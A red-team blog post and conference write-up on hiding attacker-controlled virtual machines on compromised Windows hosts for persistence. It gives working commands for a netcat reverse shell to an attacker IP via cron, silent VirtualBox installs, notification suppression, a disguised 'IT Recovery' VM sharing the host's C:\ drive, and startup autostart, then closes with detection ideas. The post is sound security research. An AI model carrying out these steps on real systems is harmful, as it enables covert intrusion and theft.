---
title: "Beware of the Shadowbunny - Using virtual machines to persist and evade detections"
date: 2020-09-23T20:00:51-07:00
draft: true
tags: [
        "red",
        "blue",
        "ttp",
        "conference"
    ]
---

This was also presented at [BSides Singapore 2020](https://bsidessg.org/). The slides are [here](/blog/downloads/Shadowbunny_BSides_Singapore_2020.pptx) and [video recording is here](https://www.youtube.com/watch?v=deGrbmTkRjQ).

## The origins of the Shadowbunny

A few years ago, around 2016, I went on a relaxing two weeklong vacation. It was great to disconnect from work. I traveled to Austria, enjoying hiking in the mountains, and exploring Vienna. 

When I came back to the office, the team had placed a giant bunny teddy into my chair. In retrospect, it seemed a legitimate replacement for the manager, *as hardly anyone seemed to have noticed my absence*.

![The original Shadowbunny](/blog/images/2020/shadowbunny-transparent.png)

At that time, I had been contemplating with the idea of using virtual machines for red teaming. Especially for lateral movement it seemed like a great way to try something new that possibly evades detections and at the same time providing a persistence mechanism.

The combination of the “shadow manager” that was put in my chair during vacation as replacement, plus the idea of using virtual machines for lateral movement was the beginning of the Shadowbunny. 

> A Shadowbunny is a virtual machine (VM) instance that is deployed by an adversary on a target host to pivot and provide  persistence and at the same time evade detections. [>> Urban Dictionary <<](https://www.urbandictionary.com/define.php?term=shadowbunny)

The VM itself does not have any security monitoring and is entirely attacker controlled.

### Using virtual machines for attacks

**Real-world adversaries are using virtual machines as well by the way.** Recently the [Ragnar Locker Ransomware](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/) was seen using a virtual machine (VirtualBox) to hide its tracks. 


During red team operations I have used the Shadowbunny mostly for measuring long term persistence, but also for unique things such as cryptocurrency mining. 

![Shadowbunny in Red Team Operations Examples](/blog/images/2020/persistence-cryptomining.jpg)

If there is interest, I can chat more about such unique exercises in another post - let me know. Let's look on why adversaries use virtual machines.

## Why would adversaries use virtual machines?

There a wide range of reasons for exploring virtual machines during lateral movement:

* **The VM is entirely attacker controlled** - a perfect sandbox for deployment “behind enemy” lines
* **Lack of monitoring and security controls inside the VM** – there is no anti-virus or detections inside the VM
* **Persistence** - VMs can be setup to automatically start again in case the host reboots
* **Obfuscation** - VMs can use disk encryption to make forensic investigations difficult
* **Backdoor** - Many virtualization products come with features to establish native host connections that might stay undetected (such as Shared Folders for persistent access to files on the host). Or an attacker could wait for new 0-days to re-gain access to the host.
* This **attack technique is not well researched but used by real world adversaries**. We need better detection capabilities.
* A **Shadowbunny pivot creates a VM on the target to pivot and this might go under the radar**
* An interesting side effect is that a VM also limits the damage that untrusted code can cause in the environment. For instance, let’s say you run a public cryptocurrency miner during a red teaming operation. The red team reviews the code, even compiles it themselves and to add additional safety measure one can run the untrusted code in a dedicated, isolated VM.

Above points are some of the reasons we will see malware leverage virtual machines more often in the future, which brings us to the reason on starting to discuss these more thoroughly.

## Why share this?

The Shadowbunny technique is a post-exploitation scenario. This means that an adversary has compromised a target and has administrative access. There is no vulnerability per se in any information described in this post.

The fact that there is now evidence that adversaries use this technique for ransomware deployment, shows that more light has to be put on understanding how virtual machines can be misused by adversaries.

The goal is to explore what is possible and to improve detections for post-exploitation scenarios. 

So, let’s dive into the technical aspects.

# Setup and Configuration

The first question is what virtualization product to choose from? There are a lot of options.... Initially, I used **Hyper-V**, as that ships out of box with Windows and if not present, can be quickly enabled.

This post focusing on **VirtualBox** to help train the blue team and explore these attacks - remember the Ragnar Locker ransomware used VirtualBox. But no worries, we also cover the most important commands for Hyper-V.

I have not yet used VMWare for this. Although after sharing this information with another red team in the industry, they leveraged VMWare successfully. They ended up manually installing it on a compromised host. There is also many other VM products and motivated actors might implement their own.

VirtualBox is a great product and it is available for multiple platforms.

## Direct Host Connections

One important aspect is that some virtualization products can be configured to have direct host access. What I mean by this is for instance the creation of a **shared folder between guest and host**, depending on the product access can be given without having to authenticate over the network. **This is a backdooring technique to be aware of.**

For malware this is ideal because otherwise accessing files on the host would go over a remote connection, which means one has to have valid credentials to authenticate to the host at all times. That can be useful also, but it is not as neat as “native” host connection using a shared folder. Hyper-V has limitation in this regards with "direct" guest to host connections.

For certain attacks, a persistent connection (or backdoor) to the host might not be necessary. For instance, imagine an adversary using a VM to mine cryptocurrency or perform offline password brute force attacks. In that case they only need a NAT or bridged LAN connection to reach their C2 infrastructure to share results. There is no need to ever access the host directly after deploying the VM.

For this demonstration and proof of concept, we are targeting a Windows machine (64 bit).

## Pre-requisites

For the scenario we are walking through there are a few pre-requisites:

### Command and Control Infrastructure

The first step is to setup basic Command & Control infrastructure (C2). Just leverage whatever C2 infrastructure you are using during red team operations. For example, here is a screenshot of Sliver by Bishop Fox setup, accepting incoming zombies (shadowbunnies) connections:

![Shadowbunny Command Center](/blog/images/2020/shadowbunny-c2-prereq.jpg)

However, for this simple demo we just use `netcat` as server. The attacker's server is hosted at `10.10.10.10`. 

We start up our `netcat` server using:

```
sudo nc -klvp 443
```

The arguments are as follows:

* `-k` allows for multiple connections, so that netcat doesn’t entirely terminate if we exit the shell
* `-l` configures netcat as a server
* `-v` is the verbose mode, so netcat displays some more information
* `-p` specifies the port to listen on, in this case we just use port 443

That is it for the demo, the C2 is up and running. The following image shows this simple setup:

![Shadowbunny Command Center](/blog/images/2020/shadowbunny-c2.png)
 
A host firewall might be blocking connections, in that case the firewall needs adjustments. During red team operation an encrypted channel should be used, possibly using HTTPS traffic on 443 to blend in. 

### Creating the Shadowbunny virtual disk image

The second pre-requisite is the Shadowbunny disk image.

**The red team can customize the VM to their hearts content, it is fully controlled by the attacker.**

The VM will probably want to automatically connect to the C2 periodically to check for commands. Possibly enable disk encryption, uninstall any unneeded software, establish direct connections to host via a shared folder or clipboard access, disabling any AV inside, sink holing telemetry, maybe USB access to have access to smart cards, or security keys and more.

The creation can be a lengthy and involved step depending on the red team operation. For certain scenarios the disk size has to be small to limit the amount of time it takes to perform lateral movement.  

> Interesting fact: The recent “Ragnar Lock Ransomware” used an old version of Windows XP – which keeps the size of the virtual machine quite small.


To get started Ubuntu Server VM is a good option. For the more advanced cases there are light-weight Linux distributions to choose from as well. In the end, the outcome will be a virtual machine disk image file (or vdi, vhd, vhdx).



**Using flock to regularly connect to the C2:**

If the VM runs Linux the `flock` command can be used to awake zombies regularly.

* Edit crontab on the attack VM (I like nano):

```
sudo crontab -e
```

* Afterward, updating the cron file:

```
* * * * * /usr/bin/flock -n /tmp/zombie.lock nc 10.10.10.10 443 -e /bin/bash
```

**Explanation:** 
The `flock` command is an elegant solution to ensure the command is only running once. The `-n` option means that if the lock file at `/tmp/zombie.lock` exists, then the process will stop. If it is not yet created, then the `netcat` command will be run and connect to the server. 

Cron jobs and `flock` come in handy for other scenarios also.


### Optional: Shared Folders and other advanced features

To support shared folders or access the hosts clipboard, the “Guest Additions” must be installed in the VM. More information, and options on how to install can be found on Ubuntu and VirtualBox websites.  

In this case I downloaded the ISO file directly into the VM using the following command.

```
wget https://download.virtualbox.org/virtualbox/6.1.8/VBoxGuestAdditions_6.1.8.iso`
```

And then installed it using the following commands:

```
sudo mkdir /mnt/cd
sudo mount VBoxGuestAdditions_6.1.8.iso /mnt/cd
sudo ./VBoxLinuxAdditions.run -–nox11
```

That’s it, the VirtualBox **Guest Additions** are now installed in the VM.

At times this step needs debugging, as the installation of the Guest Additions can be done in a variety of ways and depends on what operating system that is being used. The VirtualBox manual has more details.

Having those pre-requisites setup, we are ready to perform a **Shadowbunny pivot** using this virtual machine image.

# Kicking into higher gear

Now that client and server are ready, they can be used during lateral movement. 

[![Shadowbunny Overview](/blog/images/2020/shadowbunny-overview.jpg)](/blog/images/2020/shadowbunny-overview.jpg)

The steps involved the pivot, installation/enabling of virtualization software, downloading of the pre-created disk images, configuration and launch. Let us look at this in more detail.

## Compromise - Pivoting to the target

The initial step is to get code execution on the target with administrative credentials. 

In this case we just assume the red team as acquired an admin password and pivots onto a target machine during lateral movement. 

For this demo, let’s use Windows Remote Management (WinRM) and `Enter-PSSession`. In my test environment I have a self-signed certificate on the target host for the WinRM setup, and the port for secure WinRM is `5986`. The following commands do the initial pivot in this case: 

```
$sessionOptions = New-PsSessionOption -SkipCACheck
$creds = Get-Credential
Enter-PSSession -Computer dangerzone -Port 5986 -Credential $creds -SessionOption $sessionOptions -UseSSL
```

The following screenshot shows the three steps with a more detailed description below:
![Shadowbunny Pivot Admin](/blog/images/2020/shadowbunny-step1.png)
 
1.	Using `New-PsSessionOption` object to disable certificate check. The reason for this is that in my lab the target uses a self-signed certificate for WinRM, which the attacker’s machine doesn’t trust. In an enterprise setting that is usually not needed (if attack machine is domain joined)
2.	Using the `Get-Credential` command to store the admin credentials for the target host
3.	Execution of the `Enter-PSSession` command to establish a remote management session over TLS to the target computer called *“dangerzone”*. 

The result is a PowerShell command prompt on the remote host. Now we can explore creating our first Shadowbunny on the target.

## Checking if virtualization products are present already

Some virtualization products don't go well together, so if one is present its best to piggy back on the existing technology installed. For now, we assume no other product is present on the target.

## Downloading virtualization software

This post is focused on VirtualBox, but we will also cover some of the basic commands for Hyper-V along the way (Hyper-V is already present on Windows machines, so no need to download).

The current installer (as of writing this) for Windows is located at https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe. 

To quickly download the installer onto the target run:

```
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe
```

**Note:** The version used above is likely outdated when you read this. Also the "Guest Additions" have to match the VirtualBox version.

The following screenshot shows pivoting on the target host “dangerzone” and download VirtualBox:
![Shadowbunny Download Virtual Box](/blog/images/2020/shadowbunny-step3.png)
 
The command to download VirtualBox takes a bit depending on network speed.

### **Important Blue Team Tip**

In many environments that I have seen, and blue teams that I have spoken to, logging is fairly good when it comes to PowerShell command execution. 

Especially scripts that use `Invoke-WebRequest` or `WebClient` to download tools from the Internet get a lot of attention and are frequently manually investigated by an analyst.

However, there are many tactics to continue using PowerShell and evade detections. 

>PowerShell usage as adversarial technique will not go away, the same way we still see malware use VBScript.

Just to give a few examples on top of my head that threat hunters should be aware of:

* **Mount a Cloud SMB share and copy data** using a regular copy command.
* **My favorite is using a database connections** to load tools - but that’s because I used to work in the SQL Server division for many years and as the saying goes: “when all you have is a hammer, every problem looks like a nail” :)
* To highlight another tricky method, for instance **loading an XML document with an external entity** definition that contains attack payloads.
* There are many other ways an adversary can use PowerShell and hide by doing things slightly differently, then mainstream.

This should give some ideas on what unusual things adversaries might try to do when using PowerShell to get malware on hosts.

## Installing VirtualBox

Now that we have VirtualBox downloaded, the tricky part is to perform silent installation, so users are unaware of the software being persisted on their machines. 

Most enterprise products allow for silent installs because the IT department need these features for rollout - and attackers are just piggy backing on that mechanism.

In this case we run:

```
VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0
```

Take note of the command line parameters, there are options to perform a silent install and to avoid creating desktop and quick launch icons. We also want to avoid a reboot of the machine. 

Additional parameters to configure the system are at https://docs.oracle.com/en/virtualization/virtualbox/6.0/user/installation_windows.html.

The installation will take a few minutes. The following screenshot shows this in action:
![Shadowbunny VirtualBox Install](/blog/images/2020/shadowbunny-virtualbox-install.png)

After the installation completed, we can use the VBoxManage.exe to create VMs and configure them.

### The VBoxManage Command Line Interface

The VBoxManage binary is located at \Program Files\Oracle\VirtualBox\VBoxManage.exe by default, and can be executed as seen in the following screenshot:
![Shadowbunny VirtualBox Command Line Arguments](/blog/images/2020/shadowbunny-virtualbox-cmdargs.png)

The above image shows that installation worked, and `VBoxManage.exe` works. 

VBoxManage offers a lot of commands and features to automate management of virtual machines. The features and options of the tool are described at https://www.virtualbox.org/manual/ch08.html.

For instance, some basic commands for listing VMs are: 

```
VBoxManage list vms 
VBoxManage list runningvms
VBoxManage startvm
```

To create the new VM during lateral movement we will run a sequence of commands via VBoxManage, the management tool of VirtualBox. In the end the configuration is stored in an XML definition file, which can be registered with VBoxManage command as well.

### Disabling notifications
Optionally one can configure more settings of the product, for instance to suppress pop-up notifications:

```
VBoxManage.exe setextradata global GUI/SuppressMessages "all" 
```

Now that we know the basics of VBoxManage, let’s create move towards creation of the VM.


## Download the custom Shadowbunny VM disk image to the host

Like downloading the installation package, this can be done via multiple means. 

Let’s say we host the image on an SMB Share in Microsoft Azure:

```
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd
```

During red team operations, I have leveraged **a local file server** in an organization typically to host the file.  


## Configuring the VM

Using the `createvm` command we build out the VM and register the disk image file with the VM. `VBoxManage.exe` is installed at `\Program Files\Oracle\VirtualBox` after installation. 

* The following command will create the new VM:

    ```
    $vmname = "IT Recovery"
    .\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register
    ```
    This will create the VM and also register it right away, the output is the following:

    ```
    Virtual machine 'IT Recovery' is created and registered.
    UUID: 7891a2bd-e9cc-432a-ae2a-ba1fb2de96a4
    Settings file: 'C:\Users\wuzzi\VirtualBox VMs\IT Recovery\IT Recovery.vbox'
    ```

    Notice the settings file with the `.vbox` extension. This is the xml configuration file of the VM.

* Next, we can modify the VM to fit the simulation scenario

    In this case we add a network card for instance and configure it to use NAT, so that they VM can communicate with the outside world.

    ```
    .\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
    .\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
    .\VBoxManage.exe modifyvm $vmname --nic1 nat
    .\VBoxManage.exe modifyvm $vmname --audio none
    .\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
    .\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"
    ```

* Now it’s time to mount the Shadowbunny image

    To do that we create a storage controller

    ```
    .\VBoxManage.exe storagectl $vmname –name “SATA Controller” –add sata
    ```

* And finally attach the VHD file to the controller

    ```
    .\VBoxManage.exe storageattach $vmname –comment “Shadowbunny Disk” –storagectl “SATA Controller” –type hdd –medium “$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd” –port 0
    ```

This completes the setup of a basic VM. For deployment the `xml file` can be pre-created and passed it into the call to `createvm` with `--register`. 

To achieve persistence on the host we can do an additional trick, which is to register a shared folder with the VM. This is what we will discuss next.


## Optionally adding a shared folder

As we saw the settings file is named after the machine and has a `.vbox` extension. For instance, on my machine (using default settings) its located at `%USERPROFILE%\VirtualBox VMs\IT Recovery\IT Recovery.vbox`.

To create a shared folder between VM and host we can use the `sharedfolder`command:
```
.\VBoxManage.exe sharedfolder add $vmname –name shadow_c –hostpath c:\ -automount
```

Shared folders are configured via the xml configuration file. After running above command the following is visible in the configuration file:

```
<SharedFolders>
   <SharedFolder name="shadow_c" hostPath="c:\" writable="true" autoMount="true"/>
</SharedFolders>
```

Inside the VM (considering it is Linux based), one can simple mount the drive via (in case it wasn't auto mounted)

```
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c
```

This requires the VirtualBox **Guest Additions** to be installed on the attack VM. 

This completes the configuration, if one would open VirtualBox on the victim’s machine they would see the following UI:

![Shadowbunny VirtualBox VM ITRecovery](/blog/images/2020/shadowbunny-virtualbox-itrecovery.png)

As can be seen in in the screenshot, the virtual machine **“IT Recovery”** was successfully created and is currently powered off. Let’s power it on.

## Launching the virtual machine

Voila, now it’s time to start the VM. 

```
.\VBoxManage.exe startvm "IT Recovery" –type headless 
```
This will start up the VM and after a second print out a message like:

```
Waiting for VM "IT Recovery" to power on...
VM "IT Recovery " has been successfully started.
```

Now, the VM will boot up. 

Remember, that we added a `cron` job to the Shadowbunny VM. This means after a few moments the VM will establish a reverse shell to the command and control infrastructure.

The following screen shows the outcome as seen by the C2:
![Shadowbunny Reverse Shell](/blog/images/2020/shadowbunny-shell.png)
 
Since we also configured a shared folder to the host, we can mount the shared folder and interact with the file system on the host as seen in the following screenshot:
![Shadowbunny Shared Folder Access](/blog/images/2020/shadowbunny-sharedfolder.png)
 
The above screenshot shows the Shadowbunny VM on the compromised host connecting to the C2 infrastructure. And then its possible to directly access the filesystem on the host. 

**Pretty cool.  😊**

## Automatically launching the VM upon reboot

Unlike other virtualization products on Windows (for instance Hyper-V), VirtualBox does not have (an easy) built-in way to auto start a VM when the host reboots. 

This is good, because it allows for the blue team to have more chances to detect a misuse.

To have the VM start when the host reboots, we can add the `startvm` command to the Startup folder, register a service or use one of the other ways to run commands at startup or boot time.

Let's look at a simple solution, which is the “Startup” folder approach. 

* Create a file `config.bat` with the following command in it:

    ```
    start /min "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" startvm "IT Recovery" –type headless
    ```

* Save the file to the victim’s startup folder at:
`%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

Now, on the Command and Control side observe that the VM establishes a connection upon reboot when the user logs on to the workstation again.


## Alternative: Using Hyper-V for Shadowbunny pivots

Hyper-V ships out of box with Windows and if not enabled, can easily be enabled via:

`Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V –All` or `DISM /Online /Enable-Feature /All /FeatureName:Microsoft-Hyper-V`.

Notice: This requires a reboot of the machine.

Then PowerShell commands can be used to create/manage machines:

```
$VM = "IT Recovery"
New-VM -Name $VM
       -MemoryStartupBytes 2147483648
       -Generation 2
       -VHDPath "C:\Users\...\Virtual Hard Disks\shadowbunny.vhdx"
       -Path "C:\Users\All Users\Documents\Hyper-V\shadowbunny"
       -SwitchName (Get-VMSwitch).Name

Set-VMFirmware $VM -EnableSecureBoot Off

Start-VM $VM
```

Hyper-V does automatically resume virtual machines if the host reboots. Shared folders require a remote connection, there does not seem to be a "direct" connection from guest to host using Hyper-V.

## Endless possibilities

There seem to be endless options from an adversarial perspective on how to leverage this. Someone more familiar with hypervisor can come up with much more advanced attack scenarios even. 

**Real adversaries likely have already customized and built their own virtualization products.**

# Detection Ideas

Adversaries likely have been using this technique for a while. To get into the weeds and build detections, the following ideas are some good starting points:

* **Collect telemetry on virtual machines (and their configuration)** - ideally metrics at the hypervisor level can be collected, so that variations of this technique can be identified (custom VM products, etc.). Certainly also collecting the telemetry from well known VM products will help. I am very curious what threat hunters will come up with!
* Look for **VM products that get installed silently**, e.g. via command line options (`–silent` and `–ignore-reboot`)
* Look for **commands that enable Hyper-V** (like `Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V –All`)
* Individual calls might yield falls-positives but in combination with a remote connection that perform VM creation or virtualization product install can be inspected by an analyst or automation.
* **Regularly inspect VMs that are created** and configured on your machine
* **VM Size** - Typically VMs disks are GB in size and an adversary possibly attempts to create VMs with a rather unusual small footprint, maybe less then 500MB or smaller even. This is something to look out for.
* **Auto Start Detection** - Looking for startup scripts or registered services that run VBoxManage vmstart might point to interesting VM use scenarios. Usage of `VBoxAutostartSvc` service, `VBOXAUTOSTART_CONFIG` environment variable 
**Other VM products (Hyper-V, VMWare) do auto-start on Windows** - so be aware of that.
* **Suppressing notifications** - Looking for command line arguments that suppress notifications, similar to `setextradata global GUI/SuppressMessages "all"` might highlight places where someone actively prevents user notifications. This could be suspicious.

I imagine that real adversaries are already a step ahead and customize virtualization products for their nefarious needs. We might need better lower level monitoring capabilities and telemetry to look for that as well, like at the Hypervisor level.

If you have good ideas, please share them, or submit Yara rules.

# Conclusion

In this post we discussed how virtual machines can be used during lateral movement of red teaming operations. 

We did a deep dive with VirtualBox and Hyper-V to create, register and use a Shadowbunny VM to perform lateral movement. We highlighted advanced scenarios like shared folders that allow an adversary to gain persistence. Finally, we discussed detection ideas that blue teams can implement.

These techniques are not well researched, and we might see more attacks using virtual machines in the future (also when detections improve). Hence its important to shine more light on it and improve understanding of exploitation scenarios, detections and mitigations.

Thanks for reading, and if you found this interesting you might also like my [red teaming book](https://www.amazon.com/Cybersecurity-Attacks-Strategies-practical-penetration-ebook/dp/B0822G9PTM).

Cheers.

Twitter: [@wunderwuzzi23](https://twitter.com/wunderwuzzi23)


## Disclaimer
Penetration testing requires authorization from proper stakeholders. Information in this post is provided for research and educational purposes to advance understanding of attacks and countermeasures to help improve the security posture of infrastructure and systems. 



```
                / \
                / _ \
               | / \ |
               ||   || _______
               ||   || |\     \                       The SHADOWBUNNY :)
               ||   || ||\     \              
               ||   || || \    |             ...is hiding in virtual machines.
               ||   || ||  \__/
               ||   || ||   ||
                \\_/ \_/ \_//
               /   _     _   \
              /               \
              |    O     O    |
              |   \  ___  /   |                           
             /     \ \_/ /     \
            /  -----  |  --\    \
            |     \__/|\__/ \   |
            \       |_|_|       /
             \_____       _____/
                   \     /
                   |     |
```
*ASCII Art from https://www.asciiart.eu/animals/rabbits*


## References

* [BSides Singapore 2020](https://bsidessg.org/speaker/johann-rehberger/)
* [Ragnar Locker ransomware](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security) deploys virtual machine to dodge security 
* [VirtualBox Installation Windows](https://docs.oracle.com/en/virtualization/virtualbox/6.0/user/installation_windows.html)
* [PenTest Magazine](https://pentestmag.com/product/pentest-healthcare-security/) - This issue of the PenTest Magazine contains information around the Shadowbunny
* [Cybersecurity Attacks – Red Team Strategies](https://www.amazon.com/Cybersecurity-Attacks-Strategies-practical-penetration-ebook/dp/B0822G9PTM)
* [Hyper-V Documentation New-VM](https://docs.microsoft.com/en-us/powershell/module/hyper-v/new-vm?view=win10-ps)
* [VBoxManage CLI](https://www.virtualbox.org/manual/ch08.html)
* [Shadowbunny Presentation BSides Singapore 2020](/blog/downloads/Shadowbunny_BSides_Singapore_2020.pptx)
* ASCII Art from https://www.asciiart.eu/animals/rabbits
* Hope I didn't accidently forget anyone important